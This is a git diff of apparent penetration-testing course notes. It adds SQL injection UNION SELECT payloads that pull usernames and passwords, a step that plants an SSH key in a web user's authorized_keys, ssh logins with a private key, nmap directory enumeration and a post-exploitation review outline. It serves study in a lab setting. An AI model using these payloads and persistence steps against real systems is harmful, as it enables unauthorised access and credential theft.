@@ -209,6 +209,9 @@ ile upload
   - echo "entire rsa key" > /var/www/.ssh/authorized_keys
   - ssh www-data@<ip>
 
+* Using a private key to ssh onto a box
+  - ssh -i /home/student/test/.ssh/id_rsa comrade@127.0.0.1 -p 1115
+
 
 
 
@@ -244,7 +247,7 @@ ile upload
 * Audi' UNION SELECT username,2,passwd,jump,5 FROM session.userinfo # 
 * Audi' UNION SELECT tireid,2,size,cost,5 FROM session_schema.columns
 
-* run after finding port 80 to enumerate possible directoriesnmap 10.50.42.226 --script=http-enum.nse
+* run after finding port 80 to enumerate possible directories nmap 10.50.42.226 --script=http-enum.nse
   IF LIST Selection=2 OR 1=1
   IF NOT LIST, find unsanitized boxes, directory traversal, and/or GET method
 
@@ -667,17 +670,41 @@ touch -r 3.txt 1.txt # Reference
 * enumerate neighboring ip's
 
 
-
-
-
-
-
-
-
-
+```
+# Review 
 
 ```
+Recon 
 
+WebEx (minus XSS )
+* OR 1=1 
+* ID Vuln fields, Amount of Columns, Golden Rule, 
+* Test All Input Felds 
+* File Upload : Place to upload, wehere Its going, How to excute 
+
+Reverse Engineering 
+*  if (x * 18 = 72){ 
+  <code>
+  } 
+* if (x >> 4 = 12){
+  <code>
+  } 
+1100000 >> 4 = 1100
+
+Post Ex 
+* Different Locations 
+* Remote Logging, Cron Jobs
+* Priv. Escalation 
+* DLL, EXE 
+* TCP Dump -XX -vv 
+
+Win Ex 
+* 
+
+Lin Ex
+* 
+
+```
 
 
 
